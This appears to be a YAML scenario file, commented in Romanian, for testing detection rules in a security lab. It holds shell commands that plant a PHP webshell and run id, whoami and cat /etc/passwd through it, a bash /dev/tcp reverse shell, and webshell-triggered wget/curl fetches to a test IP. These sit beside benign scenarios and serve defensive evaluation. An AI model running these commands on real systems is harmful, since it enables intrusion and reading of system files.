# Scenarii pentru STUDIUL DE ABLATIE (configuratiile A-D). Calea rapida.
# Format identic cu scenarios_fast.yml. Generat de gen_ablation.py.
# ATACURI 9 | BENIGNE 4 (+2 de adaugat pe regulile lipsa) | INJECTIE 5 -> 18 (tinta 20).
# injection: true marcheaza scenariile de robustete (command_line cu metacharacters ES|QL).
# IP 203.0.113.10 = TEST-NET-3 (RFC 5737), nerutabil, doar ca sa nasca procesul.
scenarios:
- name: Atac RCE — webshell ruleaza id
  path: fast
  ground_truth: attack
  rule_name: 'RCE: Web server spawns shell'
  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/abl.php >/dev/null && curl -s "http://localhost/abl.php?c=id" >/dev/null && sudo rm -f /var/www/html/abl.php
- name: Atac RCE — webshell ruleaza whoami
  path: fast
  ground_truth: attack
  rule_name: 'RCE: Web server spawns shell'
  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/abl.php >/dev/null && curl -s "http://localhost/abl.php?c=whoami" >/dev/null && sudo rm -f /var/www/html/abl.php
- name: Atac RCE — webshell ruleaza uname -a
  path: fast
  ground_truth: attack
  rule_name: 'RCE: Web server spawns shell'
  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/abl.php >/dev/null && curl -s "http://localhost/abl.php?c=uname%20-a" >/dev/null && sudo rm -f /var/www/html/abl.php
- name: Atac RCE — webshell ruleaza cat /etc/passwd
  path: fast
  ground_truth: attack
  rule_name: 'RCE: Web server spawns shell'
  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/abl.php >/dev/null && curl -s "http://localhost/abl.php?c=cat%20%2Fetc%2Fpasswd" >/dev/null && sudo rm -f /var/www/html/abl.php
- name: Atac reverse shell — bash /dev/tcp
  path: fast
  ground_truth: attack
  rule_name: 'Reverse shell: Interactive shell or /dev/tcp connection'
  generate: timeout 2 bash -c "bash -i >& /dev/tcp/127.0.0.1/9999 0>&1" 2>/dev/null; echo done
- name: Atac webshell — executabil scris in webroot
  path: fast
  ground_truth: attack
  rule_name: 'Webshell: Executable written to webroot'
  generate: printf "%s" "<?php file_put_contents(\"/var/www/html/b.php\",\"x\"); ?>" | sudo tee /var/www/html/drop.php >/dev/null && curl -s "http://localhost/drop.php" >/dev/null; sudo rm -f /var/www/html/drop.php /var/www/html/b.php
- name: Atac download — webshell lanseaza wget catre IP extern
  path: fast
  ground_truth: attack
  rule_name: 'Payload download: curl/wget spawned by web server or shell'
  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/abl.php >/dev/null && curl -s "http://localhost/abl.php?c=wget%20-q%20-T%203%20-t%201%20http%3A%2F%2F203.0.113.10%2Fx%20-O%20%2Fdev%2Fnull" >/dev/null && sudo rm -f /var/www/html/abl.php
- name: Atac download — webshell lanseaza curl catre IP extern
  path: fast
  ground_truth: attack
  rule_name: 'Payload download: curl/wget spawned by web server or shell'
  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/abl.php >/dev/null && curl -s "http://localhost/abl.php?c=curl%20-s%20-m%203%20http%3A%2F%2F203.0.113.10%2Fx%20-o%20%2Fdev%2Fnull" >/dev/null && sudo rm -f /var/www/html/abl.php
- name: Atac RCE — lant de recunoastere (id; uname)
  path: fast
  ground_truth: attack
  rule_name: 'RCE: Web server spawns shell'
  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/abl.php >/dev/null && curl -s "http://localhost/abl.php?c=id%3B%20uname%20-a" >/dev/null && sudo rm -f /var/www/html/abl.php
- name: Benign download — admin curl catre localhost
  path: fast
  ground_truth: benign
  rule_name: 'Payload download: curl/wget spawned by web server or shell'
  generate: bash -c "curl -s -o /dev/null http://localhost/; true"
- name: Benign download — admin wget catre localhost
  path: fast
  ground_truth: benign
  rule_name: 'Payload download: curl/wget spawned by web server or shell'
  generate: bash -c "wget -q -O /dev/null http://localhost/ 2>/dev/null; true"
- name: Benign download — healthcheck admin pe 127.0.0.1
  path: fast
  ground_truth: benign
  rule_name: 'Payload download: curl/wget spawned by web server or shell'
  generate: bash -c "curl -s -o /dev/null http://127.0.0.1/server-status; true"
- name: Benign download — admin curl cu user-agent propriu
  path: fast
  ground_truth: benign
  rule_name: 'Payload download: curl/wget spawned by web server or shell'
  generate: bash -c "curl -s -A soc-check -o /dev/null http://localhost/index.html; true"
- name: Injectie 1 — RCE cu metacharacters ES|QL in command_line
  path: fast
  ground_truth: attack
  injection: true
  rule_name: 'RCE: Web server spawns shell'
